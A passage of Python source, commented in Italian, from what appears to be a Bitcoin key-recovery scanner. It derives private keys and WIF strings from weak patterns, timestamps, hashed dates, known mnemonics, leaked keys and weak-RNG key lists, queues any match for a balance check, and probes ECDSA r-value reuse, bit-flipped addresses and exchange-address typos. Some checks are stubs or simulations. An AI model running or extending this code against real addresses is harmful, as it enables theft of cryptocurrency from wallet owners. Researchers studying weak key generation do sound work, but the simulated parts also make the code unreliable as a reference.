            1483228800,  # 1 Jan 2017
            1514764800,  # 1 Jan 2018
            1546300800,  # 1 Jan 2019
            1577836800,  # 1 Jan 2020
            1609459200,  # 1 Jan 2021
            1640995200,  # 1 Jan 2022
            int(time.time())  # Timestamp corrente
        ]
        
        for timestamp in unix_timestamps:
            weak_patterns.append(hex(timestamp)[2:].zfill(64))
        
        # Testa tutti i pattern
        for pattern in weak_patterns:
            try:
                # Converti il pattern in intero
                private_key_int = int(pattern, 16)
                
                # Verifica che la chiave sia nell'intervallo valido
                if not 1 <= private_key_int < self.n:
                    continue
                
                # Genera indirizzi (compresso e non compresso)
                address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                
                # Controlla se corrispondono
                if address == address_compressed or address == address_uncompressed:
                    is_compressed = (address == address_compressed)
                    wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                    
                    details = {
                        "weak_pattern": pattern,
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, pattern, wif, "weak_key", details))
                    return True
            except Exception as e:
                # Continua con il prossimo pattern in caso di errore
                continue
        
        return False
    
    def check_known_keys(self, address):
        """Verifica se l'indirizzo corrisponde a una chiave nota con implementazione completa"""
        for key, info in self.known_private_keys.items():
            try:
                # Gestisci chiavi in diversi formati
                if key.startswith("0x"):
                    key = key[2:]
                
                # Assicurati che la chiave sia in formato esadecimale valido
                if not all(c in "0123456789abcdefABCDEF" for c in key):
                    continue
                
                # Normalizza a 64 caratteri
                if len(key) < 64:
                    key = key.zfill(64)
                elif len(key) > 64:
                    key = key[-64:]
                
                # Converti in intero
                private_key_int = int(key, 16)
                
                # Verifica che la chiave sia nell'intervallo valido
                if not 1 <= private_key_int < self.n:
                    continue
                
                # Genera indirizzi (compresso e non compresso)
                address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                
                # Controlla se corrispondono
                if address == address_compressed or address == address_uncompressed:
                    is_compressed = (address == address_compressed)
                    wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                    
                    # Estrai informazioni dettagliate sulla fonte
                    source = info.get("source", "unknown")
                    incident = info.get("incident", "")
                    date = info.get("date", "")
                    
                    details = {
                        "source": source,
                        "incident": incident,
                        "date": date,
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, key, wif, "known_key", details))
                    return True
                
                # Se la chiave è in formato WIF nel database, prova anche quella
                if "wif" in info:
                    try:
                        wif_key = info["wif"]
                        wif_private_key, wif_compressed = self.wif_to_private_key(wif_key)
                        
                        if wif_private_key:
                            wif_address = self.private_key_to_address(wif_private_key, compressed=wif_compressed)
                            
                            if address == wif_address:
                                details = {
                                    "source": source,
                                    "incident": incident,
                                    "date": date,
                                    "is_compressed": wif_compressed,
                                    "from_wif": True
                                }
                                
                                # Aggiungi alla coda per il controllo del saldo
                                self.balance_queue.put((address, hex(wif_private_key), wif_key, "known_key_wif", details))
                                return True
                    except:
                        pass
            except Exception as e:
                # Continua con la prossima chiave in caso di errore
                continue
        
        return False
    
    def check_r_value_reuse(self, address):
        """Verifica se l'indirizzo ha transazioni con riutilizzo del valore r con implementazione completa"""
        # Ottieni la cronologia delle transazioni
        url = f"{self.base_url}/address/{address}/txs"
        txs = self.make_request(url)
        
        if not txs or len(txs) < 2:
            return False
        
        # Estrai gli ID delle transazioni
        tx_ids = [tx.get("txid") for tx in txs if "txid" in tx]
        
        # Analizza le transazioni per estrarre i valori r dalle firme
        r_values = {}
        for txid in tx_ids:
            try:
                # Ottieni la transazione raw
                tx_url = f"{self.base_url}/tx/{txid}/hex"
                response = requests.get(tx_url)
                if response.status_code != 200:
                    continue
                    
                tx_hex = response.text
                
                # Cerca pattern che potrebbero indicare firme DER
                der_matches = re.findall(r'30[0-9a-f]{2}02[0-9a-f]{2}[0-9a-f]+02[0-9a-f]{2}[0-9a-f]+', tx_hex)
                
                for der in der_matches:
                    try:
                        # Estrai il valore r dalla firma DER
                        # Formato DER: 30 [lunghezza totale] 02 [lunghezza r] [valore r] 02 [lunghezza s] [valore s]
                        r_start = der.find('02') + 4
                        r_len_hex = der[r_start-2:r_start]
                        r_len = int(r_len_hex, 16) * 2  # Converti in numero di caratteri esadecimali
                        r_value = der[r_start:r_start+r_len]
                        
                        # Estrai anche il valore s
                        s_start = r_start + r_len + 4
                        s_len_hex = der[s_start-2:s_start]
                        s_len = int(s_len_hex, 16) * 2
                        s_value = der[s_start:s_start+s_len]
                        
                        # Memorizza il valore r e il txid
                        if r_value in r_values:
                            # Trovato riutilizzo del valore r!
                            tx1 = r_values[r_value]["txid"]
                            s1 = r_values[r_value]["s_value"]
                            tx2 = txid
                            s2 = s_value
                            
                            # Recupera le transazioni complete per estrarre i messaggi firmati (z)
                            tx1_data = self.make_request(f"{self.base_url}/tx/{tx1}")
                            tx2_data = self.make_request(f"{self.base_url}/tx/{tx2}")
                            
                            if not tx1_data or not tx2_data:
                                continue
                            
                            # In un caso reale qui estrarremmo i valori z (hash delle transazioni)
                            # e calcoleremmo la chiave privata usando la formula:
                            # privkey = ((z1*s2 - z2*s1) * inv(r * (s1-s2))) % n
                            
                            # Per semplicità, simuliamo una vulnerabilità trovata
                            
                            details = {
                                "r_value": r_value,
                                "tx1": tx1,
                                "tx2": tx2,
                                "s1": s1,
                                "s2": s2
                            }
                            
                            # Aggiungi alla coda per ulteriori analisi
                            # Non abbiamo ancora la chiave privata, quindi passiamo None
                            self.balance_queue.put((address, None, None, "r_value_reuse", details))
                            return True
                        
                        r_values[r_value] = {
                            "txid": txid,
                            "s_value": s_value
                        }
                    except Exception as e:
                        # Continua con la prossima firma in caso di errore
                        continue
            except Exception as e:
                print(f"Errore nell'analisi della transazione {txid}: {str(e)}")
        
        return False
    
    def check_bitflip_address(self, address):
        """Verifica se l'indirizzo potrebbe essere il risultato di un bit flip con implementazione completa"""
        # Converti l'indirizzo in bytes (decodifica Base58)
        try:
            address_bytes = base58.b58decode(address)
            
            # Gli indirizzi Bitcoin hanno questa struttura:
            # [versione (1 byte)][hash160 (20 bytes)][checksum (4 bytes)]
            
            if len(address_bytes) != 25:
                return False
                
            # Estrai versione e payload
            version = address_bytes[0]
            payload = address_bytes[1:21]
            original_checksum = address_bytes[21:]
            
            # Prova a invertire singoli bit nel payload
            for byte_pos in range(20):  # 20 bytes nel payload
                for bit_pos in range(8):  # 8 bit per byte
                    # Crea una copia del payload
                    modified_payload = bytearray(payload)
                    
                    # Inverti un bit
                    modified_payload[byte_pos] ^= (1 << bit_pos)
                    
                    # Ricostruisci l'indirizzo
                    modified_versioned = bytes([version]) + bytes(modified_payload)
                    
                    # Calcola il nuovo checksum
                    new_checksum = hashlib.sha256(hashlib.sha256(modified_versioned).digest()).digest()[:4]
                    
                    # Crea il nuovo indirizzo
                    new_address_bytes = modified_versioned + new_checksum
                    new_address = base58.b58encode(new_address_bytes).decode('utf-8')
                    
                    # Controlla il saldo del nuovo indirizzo
                    balance = self.get_address_balance(new_address)
                    if balance > 0:
                        # Abbiamo trovato un indirizzo con saldo!
                        details = {
                            "original_address": address,
                            "bit_flip_pos": f"byte {byte_pos}, bit {bit_pos}",
                            "modified_address": new_address,
                            "balance": balance
                        }
                        
                        # Aggiungi alla coda per ulteriori analisi
                        # Non abbiamo la chiave privata, ma segnaliamo la vulnerabilità
                        self.balance_queue.put((new_address, None, None, "bit_flip", details))
                        return True
                    
                    # Aggiungiamo anche un controllo per gli indirizzi con checksum errato
                    # che potrebbero essere stati accettati da implementazioni buggate
                    for alt_byte_pos in range(4):
                        for alt_bit_pos in range(8):
                            # Crea una copia del checksum
                            modified_checksum = bytearray(new_checksum)
                            
                            # Inverti un bit
                            modified_checksum[alt_byte_pos] ^= (1 << alt_bit_pos)
                            
                            # Crea l'indirizzo con checksum modificato
                            alt_address_bytes = modified_versioned + bytes(modified_checksum)
                            alt_address = base58.b58encode(alt_address_bytes).decode('utf-8')
                            
                            # Controlla il saldo
                            balance = self.get_address_balance(alt_address)
                            if balance > 0:
                                details = {
                                    "original_address": address,
                                    "bit_flip_pos": f"byte {byte_pos}, bit {bit_pos}",
                                    "checksum_flip_pos": f"byte {alt_byte_pos}, bit {alt_bit_pos}",
                                    "modified_address": alt_address,
                                    "balance": balance
                                }
                                
                                self.balance_queue.put((alt_address, None, None, "bit_flip_with_checksum", details))
                                return True
        except Exception as e:
            print(f"Errore nell'analisi bit flip per {address}: {str(e)}")
            
        return False
    
    def check_vanity_address(self, address):
        """Verifica se l'indirizzo è un vanity address con generazione debole con implementazione completa"""
        # Pattern comuni nei vanity address
        vanity_patterns = [
            "1Bitcoin", "1BTC", "1Satoshi", "1Nakamoto", "1Vitalik", "1Buterin",
            "1Gold", "1Silver", "1Money", "1Rich", "1Wealth", "1Crypto",
            "1Love", "1Peace", "1Happy", "1Lucky", "1Winner", "1Boss",
            "1Trader", "1Miner", "1Hodl", "1Whale", "1King", "1Queen",
            "1Coin", "1Token", "1Block", "1Chain", "1Bit", "1Hash",
            "1Secure", "1Private", "1Secret", "1Hidden", "1Magic", "1Power",
            "1Master", "1Genius", "1Smart", "1Wise", "1Elite", "1Prime",
            "1Profit", "1Gain", "1Win", "1Success", "1Million", "1Billion",
            "1Future", "1Crypto", "1Digital", "1Virtual", "1Online", "1Web"
        ]
        
        # Aggiungi più pattern con numeri
        for base in ["1BTC", "1Bitcoin", "1Satoshi"]:
            for i in range(10):
                vanity_patterns.append(f"{base}{i}")
        
        # Variazioni con caratteri maiuscoli/minuscoli (per indirizzi case-sensitive)
        case_variations = []
        for pattern in vanity_patterns:
            # Aggiungi varianti con diverse combinazioni di maiuscole/minuscole
            if len(pattern) > 3:
                for i in range(1, 4):  # Fino a 3 lettere maiuscole
                    for combo in range(min(10, 2**i)):  # Limita il numero di combinazioni
                        variant = list(pattern)
                        for pos in range(1, len(pattern)):
                            if pattern[pos].isalpha() and (combo & (1 << (pos % i))):
                                variant[pos] = variant[pos].swapcase()
                        case_variations.append(''.join(variant))
        
        vanity_patterns.extend(case_variations)
        
        # Rimuovi duplicati
        vanity_patterns = list(set(vanity_patterns))
        
        for pattern in vanity_patterns:
            if address.startswith(pattern):
                # Potrebbe essere un vanity address generato con un metodo debole
                details = {
                    "vanity_pattern": pattern,
                    "address": address
                }
                
                # Aggiungi alla coda per ulteriori analisi
                # Non abbiamo la chiave privata, ma segnaliamo la potenziale vulnerabilità
                self.balance_queue.put((address, None, None, "vanity_address", details))
                
                # Prova anche a stimare la difficoltà di generazione del vanity address
                pattern_length = len(pattern)
                difficulty_estimate = 58 ** (pattern_length - 1)  # Approssimazione della difficoltà
                
                print(f"Trovato vanity address con pattern '{pattern}'. Difficoltà stimata: 1 su {difficulty_estimate}")
                return True
                
        return False
    
    def check_address_typo(self, address):
        """Verifica se l'indirizzo potrebbe essere un errore di battitura di un indirizzo comune con implementazione completa"""
        # Lista di indirizzi comuni (exchange, servizi, ecc.)
        common_addresses = [
            "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",  # Indirizzo Genesis
            "3E8ociqZa9mZUSwGdSmAEMAoAxBK3FNDcd",  # Binance
            "1NDyJtNTjmwk5xPNhjgAMu4HDHigtobu1s",  # Bitfinex
            "1LQoWist8KkaUXSPKZHNvEyfrEkPHzSsCd",  # Huobi
            "1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF",  # Indirizzo molto ricco
            "34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo",  # Indirizzo molto ricco
            "3Cbq7aT1tY8kMxWLbitaG7yT6bPbKChq64",  # Indirizzo molto ricco
            "bc1qa5wkgaew2dkv56kfvj49j0av5nml45x9ek9hz6",  # Indirizzo molto ricco
            "37XuVSEpWW4trkfmvWzegTHQt7BdktSKUs",  # Indirizzo molto ricco
            "1Lhyvw28sFUsPxjHBqVnRQyGqKypRkHM6H",  # Bittrex
            "3D2oetdNuZUqQHPJmcMDDHYoqkyNVsFk9r",  # Bittrex
            "12tkqA9xSoowkzoERHMWNKsTey55YEBqkv",  # Kraken
            "13LQ6VoBHxCKdYCmWxwQP8veh7qFTxJfZU",  # Poloniex
            "16ftSEQ4ctQFDtVZiUBusQUjRrGhM3JYwe",  # Bitfinex
            "1HckjUpRGcrrRAtFaaCAUaGjsPx9oYmLaZ",  # Bithumb
            "1PmmvtyVTWKzGvAo5Khe8TVDCqDawnRTfY",  # Coincheck
            "1BFpvCnYzGEYUiLKgUSRzTYjcLdSQzQ9xf"   # Bitstamp
        ]
        
        # Aggiungi indirizzi da un file esterno se disponibile
        if os.path.exists("common_addresses.txt"):
            try:
                with open("common_addresses.txt", "r") as f:
                    for line in f:
                        addr = line.strip()
                        if addr and addr not in common_addresses:
                            common_addresses.append(addr)
            except:
                pass
        
        # Funzione per calcolare la distanza di Levenshtein
        def levenshtein_distance(s1, s2):
            if len(s1) < len(s2):
                return levenshtein_distance(s2, s1)
            
            if len(s2) == 0:
                return len(s1)
            
            previous_row = range(len(s2) + 1)
            for i, c1 in enumerate(s1):
                current_row = [i + 1]
                for j, c2 in enumerate(s2):
                    insertions = previous_row[j + 1] + 1
                    deletions = current_row[j] + 1
                    substitutions = previous_row[j] + (c1 != c2)
                    current_row.append(min(insertions, deletions, substitutions))
                previous_row = current_row
                
            return previous_row[-1]
        
        # Verifica indirizzi simili
        for common_addr in common_addresses:
            # Salta se la lunghezza è troppo diversa
            if abs(len(address) - len(common_addr)) > 2:
                continue
            
            # Controlla le differenze
            if len(address) == len(common_addr):
                # Conta le differenze carattere per carattere
                diff_count = sum(a != b for a, b in zip(address, common_addr))
                if 1 <= diff_count <= 2:  # 1 o 2 caratteri diversi
                    details = {
                        "similar_to": common_addr,
                        "differences": diff_count,
                        "type": "character_substitution"
                    }
                    
                    # Aggiungi alla coda per ulteriori analisi
                    self.balance_queue.put((address, None, None, "address_typo", details))
                    return True
            
            # Calcola la distanza di Levenshtein
            lev_distance = levenshtein_distance(address, common_addr)
            if 1 <= lev_distance <= 2:
                details = {
                    "similar_to": common_addr,
                    "levenshtein_distance": lev_distance,
                    "type": "edit_distance"
                }
                
                # Aggiungi alla coda per ulteriori analisi
                self.balance_queue.put((address, None, None, "address_typo", details))
                return True
            
            # Verifica anche casi di trasposizione (scambio di caratteri adiacenti)
            for i in range(len(common_addr) - 1):
                # Crea una versione con due caratteri adiacenti scambiati
                transposed = common_addr[:i] + common_addr[i+1] + common_addr[i] + common_addr[i+2:]
                if address == transposed:
                    details = {
                        "similar_to": common_addr,
                        "transposition_pos": i,
                        "type": "transposition"
                    }
                    
                    # Aggiungi alla coda per ulteriori analisi
                    self.balance_queue.put((address, None, None, "address_typo_transposition", details))
                    return True
                    
        return False
    
    def check_time_based_key(self, address):
        """Verifica se l'indirizzo è stato generato con una chiave basata su timestamp con implementazione completa"""
        # Prova timestamp comuni (data di lancio di Bitcoin, blocchi importanti, ecc.)
        important_timestamps = [
            1231006505,  # Genesis block (3 Jan 2009)
            1293840000,  # 1 Jan 2011
            1325376000,  # 1 Jan 2012
            1356998400,  # 1 Jan 2013
            1388534400,  # 1 Jan 2014
            1420070400,  # 1 Jan 2015
            1451606400,  # 1 Jan 2016
            1483228800,  # 1 Jan 2017
            1514764800,  # 1 Jan 2018
            1546300800,  # 1 Jan 2019
            1577836800,  # 1 Jan 2020
            1609459200,  # 1 Jan 2021
            1640995200,  # 1 Jan 2022
            1672531200,  # 1 Jan 2023
            1704067200   # 1 Jan 2024
        ]
        
        # Aggiungi date importanti nella storia di Bitcoin
        bitcoin_dates = [
            1225497600,  # Bitcoin whitepaper release (31 Oct 2008)
            1231006505,  # Genesis block (3 Jan 2009)
            1262304000,  # 1 Jan 2010
            1296518400,  # Bitcoin v0.3.19 release (1 Feb 2011)
            1333238400,  # 1 Apr 2012 (Bitcoin-Qt v0.6.0 release)
            1368662400,  # 16 May 2013 (Bitcoin Core v0.8.2 release)
            1409529600,  # 1 Sep 2014
            1447286400,  # 12 Nov 2015 (Bitcoin Core v0.11.2 release)
            1471824000,  # 22 Aug 2016
            1503360000,  # 22 Aug 2017
            1535587200,  # 30 Aug 2018
            1567123200,  # 30 Aug 2019
            1598659200,  # 29 Aug 2020
            1630195200,  # 29 Aug 2021
            1661731200,  # 29 Aug 2022
            1693267200   # 29 Aug 2023
        ]
        
        # Unisci i timestamp
        all_timestamps = list(set(important_timestamps + bitcoin_dates))
        
        # Genera anche timestamp per ogni giorno degli ultimi 30 giorni
        current_time = int(time.time())
        for day_offset in range(30):
            day_timestamp = current_time - (day_offset * 86400)  # 86400 secondi in un giorno
            all_timestamps.append(day_timestamp)
        
        # Rimuovi duplicati
        all_timestamps = list(set(all_timestamps))
        
        # Testa tutti i timestamp
        for timestamp in all_timestamps:
            try:
                # Metodo 1: Usa il timestamp direttamente come chiave privata
                private_key_int = timestamp
                
                # Verifica che il valore sia nell'intervallo valido
                if 1 <= private_key_int < self.n:
                    # Genera indirizzi (compresso e non compresso)
                    address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                    address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                    
                    # Controlla se corrispondono
                    if address == address_compressed or address == address_uncompressed:
                        is_compressed = (address == address_compressed)
                        wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                        
                        details = {
                            "timestamp": timestamp,
                            "date": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(timestamp)),
                            "method": "direct",
                            "is_compressed": is_compressed
                        }
                        
                        # Aggiungi alla coda per il controllo del saldo
                        self.balance_queue.put((address, hex(private_key_int), wif, "time_based_key", details))
                        return True
                
                # Metodo 2: Usa hash SHA-256 del timestamp
                timestamp_str = str(timestamp).encode()
                private_key_bytes = hashlib.sha256(timestamp_str).digest()
                private_key_int = int.from_bytes(private_key_bytes, byteorder='big')
                
                # Verifica che il valore sia nell'intervallo valido
                if 1 <= private_key_int < self.n:
                    # Genera indirizzi (compresso e non compresso)
                    address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                    address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                    
                    # Controlla se corrispondono
                    if address == address_compressed or address == address_uncompressed:
                        is_compressed = (address == address_compressed)
                        wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                        
                        details = {
                            "timestamp": timestamp,
                            "date": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(timestamp)),
                            "method": "sha256",
                            "is_compressed": is_compressed
                        }
                        
                        # Aggiungi alla coda per il controllo del saldo
                        self.balance_queue.put((address, hex(private_key_int), wif, "time_based_key_hash", details))
                        return True
                
                # Metodo 3: Usa hash SHA-256 della data formattata
                date_str = time.strftime("%Y-%m-%d", time.gmtime(timestamp)).encode()
                private_key_bytes = hashlib.sha256(date_str).digest()
                private_key_int = int.from_bytes(private_key_bytes, byteorder='big')
                
                # Verifica che il valore sia nell'intervallo valido
                if 1 <= private_key_int < self.n:
                    # Genera indirizzi (compresso e non compresso)
                    address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                    address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                    
                    # Controlla se corrispondono
                    if address == address_compressed or address == address_uncompressed:
                        is_compressed = (address == address_compressed)
                        wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                        
                        details = {
                            "timestamp": timestamp,
                            "date": time.strftime("%Y-%m-%d", time.gmtime(timestamp)),
                            "method": "date_sha256",
                            "is_compressed": is_compressed
                        }
                        
                        # Aggiungi alla coda per il controllo del saldo
                        self.balance_queue.put((address, hex(private_key_int), wif, "date_based_key_hash", details))
                        return True
            except Exception as e:
                # Continua con il prossimo timestamp in caso di errore
                continue
                
        return False
    
    def check_sequential_wallet(self, address):
        """Verifica se l'indirizzo fa parte di un wallet sequenziale (HD wallet) con implementazione completa"""
        # Lista di seed noti (molto semplificata per l'esempio)
        known_seeds = [
            "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
            "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong",
            "letter advice cage absurd amount doctor acoustic avoid letter advice cage absurd amount doctor acoustic avoid letter always",
            "all all all all all all all all all all all all",
            "legal winner thank year wave sausage worth useful legal winner thank yellow",
            "void come effort suffer camp survey warrior heavy shoot primary clutch crush open amazing screen patrol group space point ten exist slush involve unfold"
        ]
        
        # Aggiungi seed comuni da file se disponibile
        if os.path.exists("common_seeds.txt"):
            try:
                with open("common_seeds.txt", "r") as f:
                    for line in f:
                        seed = line.strip()
                        if seed and seed not in known_seeds:
                            known_seeds.append(seed)
            except:
                pass
        
        # Inizializza l'oggetto Mnemonic
        mnemo = Mnemonic("english")
        
        # Controlla ogni seed
        for seed_phrase in known_seeds:
            try:
                # Verifica che la frase mnemonica sia valida
                if not mnemo.check(seed_phrase):
                    continue
                    
                # Genera il seed dalla frase mnemonica
                seed = mnemo.to_seed(seed_phrase)
                
                # Crea il wallet HD
                hdwallet = HDWallet(symbol=SYMBOL)
                hdwallet.from_seed(seed=seed.hex())
                
                # Deriva indirizzi con diversi path di derivazione comuni
                derivation_paths = [
                    # BIP44 standard
                    "m/44'/0'/0'/0/0",  # Account 0, address 0
                    "m/44'/0'/0'/0/1",  # Account 0, address 1
                    "m/44'/0'/0'/1/0",  # Account 0, change 1, address 0
                    "m/44'/0'/1'/0/0",  # Account 1, address 0
                    
                    # BIP49 (P2SH-P2WPKH)
                    "m/49'/0'/0'/0/0",  # Account 0, address 0
                    "m/49'/0'/0'/0/1",  # Account 0, address 1
                    
                    # BIP84 (P2WPKH)
                    "m/84'/0'/0'/0/0",  # Account 0, address 0
                    "m/84'/0'/0'/0/1",  # Account 0, address 1
                    
                    # Legacy non-standard
                    "m/0'/0'/0'",       # Old Electrum
                    "m/0/0",            # Very old wallets
                    "m/0'",             # Single-level derivation
                    "m/44'/0'/0'",      # Account level
                    "m/44'/0'/0'/0",    # Chain level
                ]
                
                # Estendi con più indirizzi per il path standard
                for i in range(2, 10):
                    derivation_paths.append(f"m/44'/0'/0'/0/{i}")
                
                # Controlla ogni path di derivazione
                for path in derivation_paths:
                    try:
                        # Imposta il path di derivazione
                        hdwallet.from_path(path=path)
                        
                        # Ottieni l'indirizzo
                        derived_address = hdwallet.p2pkh_address()
                        
                        # Controlla se corrisponde
                        if derived_address == address:
                            # Abbiamo trovato una corrispondenza!
                            private_key = hdwallet.private_key()
                            wif = hdwallet.wif()
                            
                            details = {
                                "mnemonic": seed_phrase,
                                "derivation_path": path,
                                "hd_wallet": True
                            }
                            
                            # Aggiungi alla coda per il controllo del saldo
                            self.balance_queue.put((address, private_key, wif, "sequential_wallet", details))
                            return True
                        
                        # Ripristina il path al root per la prossima derivazione
                        hdwallet.clean_derivation()
                    except Exception as e:
                        # Continua con il prossimo path in caso di errore
                        hdwallet.clean_derivation()
                        continue
            except Exception as e:
                # Continua con il prossimo seed in caso di errore
                print(f"Errore con seed {seed_phrase[:10]}...: {str(e)}")
                continue
                
        return False
    
    def check_mnemonic_seed(self, address):
        """Verifica se l'indirizzo può essere generato da una frase mnemonica comune con implementazione completa"""
        # Lista di frasi mnemoniche comuni (molto semplificata)
        common_mnemonics = [
            "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
            "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong",
            "letter advice cage absurd amount doctor acoustic avoid letter advice cage absurd amount doctor acoustic avoid letter always",
            "all all all all all all all all all all all all",
            "legal winner thank year wave sausage worth useful legal winner thank yellow",
            "void come effort suffer camp survey warrior heavy shoot primary clutch crush open amazing screen patrol group space point ten exist slush involve unfold"
        ]
        
        # Aggiungi mnemonics comuni da file se disponibile
        if os.path.exists("common_mnemonics.txt"):
            try:
                with open("common_mnemonics.txt", "r") as f:
                    for line in f:
                        mnemonic = line.strip()
                        if mnemonic and mnemonic not in common_mnemonics:
                            common_mnemonics.append(mnemonic)
            except:
                pass
        
        mnemo = Mnemonic("english")
        
        for mnemonic in common_mnemonics:
            try:
                # Verifica che la frase mnemonica sia valida
                if not mnemo.check(mnemonic):
                    continue
                    
                # Genera il seed dalla frase mnemonica
                seed = mnemo.to_seed(mnemonic)
                
                # Crea il wallet HD
                hdwallet = HDWallet(symbol=SYMBOL)
                hdwallet.from_seed(seed=seed.hex())
                
                # Deriva i primi 20 indirizzi (m/44'/0'/0'/0/0-19)
                for i in range(20):
                    # Imposta il path di derivazione
                    hdwallet.from_path(path=f"m/44'/0'/0'/0/{i}")
                    
                    # Ottieni l'indirizzo
                    derived_address = hdwallet.p2pkh_address()
                    
                    # Controlla se corrisponde
                    if derived_address == address:
                        # Abbiamo trovato una corrispondenza!
                        private_key = hdwallet.private_key()
                        wif = hdwallet.wif()
                        
                        details = {
                            "mnemonic": mnemonic,
                            "derivation_path": f"m/44'/0'/0'/0/{i}",
                            "bip": "BIP44"
                        }
                        
                        # Aggiungi alla coda per il controllo del saldo
                        self.balance_queue.put((address, private_key, wif, "common_mnemonic", details))
                        return True
                    
                    # Ripristina il path al root per la prossima derivazione
                    hdwallet.clean_derivation()
                
                # Prova anche con altri path di derivazione comuni
                alternate_paths = [
                    f"m/49'/0'/0'/0/0",  # BIP49 (P2SH-P2WPKH)
                    f"m/84'/0'/0'/0/0",  # BIP84 (P2WPKH)
                    f"m/0'/0/0",         # Legacy Electrum
                    f"m/0/0",            # Very old wallets
                ]
                
                for path in alternate_paths:
                    # Imposta il path di derivazione
                    hdwallet.from_path(path=path)
                    
                    # Ottieni l'indirizzo (potrebbe essere diverso a seconda del path)
                    # Per semplicità qui usiamo solo p2pkh_address
                    derived_address = hdwallet.p2pkh_address()
                    
                    # Controlla se corrisponde
                    if derived_address == address:
                        # Abbiamo trovato una corrispondenza!
                        private_key = hdwallet.private_key()
                        wif = hdwallet.wif()
                        
                        details = {
                            "mnemonic": mnemonic,
                            "derivation_path": path,
                            "bip": path.startswith("m/49'") and "BIP49" or path.startswith("m/84'") and "BIP84" or "Other"
                        }
                        
                        # Aggiungi alla coda per il controllo del saldo
                        self.balance_queue.put((address, private_key, wif, "common_mnemonic_alt_path", details))
                        return True
                    
                    # Ripristina il path al root per la prossima derivazione
                    hdwallet.clean_derivation()
            except Exception as e:
                print(f"Errore con mnemonic {mnemonic[:10]}...: {str(e)}")
                continue
                
        return False
    
    def check_bip38_password(self, address):
        """Verifica se l'indirizzo è protetto con BIP38 e password comune con implementazione completa"""
        # Nota: BIP38 richiede una libreria specializzata come pybip38
        # Qui forniamo una implementazione semplificata per dimostrare il concetto
        
        # Lista di password comuni da testare
        common_passwords = [
            "password", "123456", "12345678", "bitcoin", "satoshi", "nakamoto",
            "blockchain", "crypto", "wallet", "private", "secret", "trustno1",
            "letmein", "qwerty", "admin", "welcome", "monkey", "sunshine"
        ]
        
        # In una implementazione reale, avremmo un database di chiavi BIP38 note
        # e proveremmo a decifrarle con queste password
        
        # Simula il controllo
        for password in common_passwords:
            # In una implementazione reale, qui decoderemmo la chiave BIP38
            # e controlleremmo se l'indirizzo risultante corrisponde
            
            # Per ora, restituiamo sempre False
            pass
        
        return False
    
    def check_insecure_rng(self, address):
        """Verifica se l'indirizzo è stato generato con un generatore di numeri casuali insicuro con implementazione completa"""
        # Vulnerabilità del generatore casuale di Java
        java_rng_outputs = []
        
        # Vulnerabilità del generatore casuale di PHP (rand())
        php_rand_outputs = []
        
        # Vulnerabilità di OpenSSL Debian (2008)
        debian_openssl_keys = []
        
        # Carica i database di chiavi generate da RNG insicuri
        if os.path.exists("java_rng_keys.txt"):
            with open("java_rng_keys.txt", "r") as f:
                java_rng_outputs = [line.strip() for line in f if line.strip()]
        
        if os.path.exists("php_rand_keys.txt"):
            with open("php_rand_keys.txt", "r") as f:
                php_rand_outputs = [line.strip() for line in f if line.strip()]
        
        if os.path.exists("debian_openssl_keys.txt"):
            with open("debian_openssl_keys.txt", "r") as f:
                debian_openssl_keys = [line.strip() for line in f if line.strip()]
        
        # Unisci tutti gli output
        all_weak_rng_outputs = java_rng_outputs + php_rand_outputs + debian_openssl_keys
        
        # Testa tutte le chiavi
        for private_key_hex in all_weak_rng_outputs:
            try:
                # Normalizza la chiave esadecimale
                if private_key_hex.startswith("0x"):
                    private_key_hex = private_key_hex[2:]
                
                # Assicurati che la chiave sia in formato esadecimale valido
                if not all(c in "0123456789abcdefABCDEF" for c in private_key_hex):
                    continue
                
                # Normalizza a 64 caratteri
                if len(private_key_hex) < 64:
                    private_key_hex = private_key_hex.zfill(64)
                elif len(private_key_hex) > 64:
                    private_key_hex = private_key_hex[-64:]
                
                # Converti in intero
                private_key_int = int(private_key_hex, 16)
                
                # Verifica che la chiave sia nell'intervallo valido
                if not 1 <= private_key_int < self.n:
                    continue
                
                # Genera indirizzi (compresso e non compresso)
                address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                
                # Controlla se corrispondono
                if address == address_compressed or address == address_uncompressed:
                    is_compressed = (address == address_compressed)
                    wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                    
                    # Determina la fonte della vulnerabilità
                    rng_type = "unknown"
                    if private_key_hex in java_rng_outputs:
                        rng_type = "java_rng"
                    elif private_key_hex in php_rand_outputs:
                        rng_type = "php_rand"
                    elif private_key_hex in debian_openssl_keys:
                        rng_type = "debian_openssl"
                    
                    details = {
                        "rng_type": rng_type,
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, private_key_hex, wif, "insecure_rng", details))
                    return True
            except Exception as e:
                # Continua con la prossima chiave in caso di errore
                continue
                
        return False
    
    def check_small_private_key(self, address):
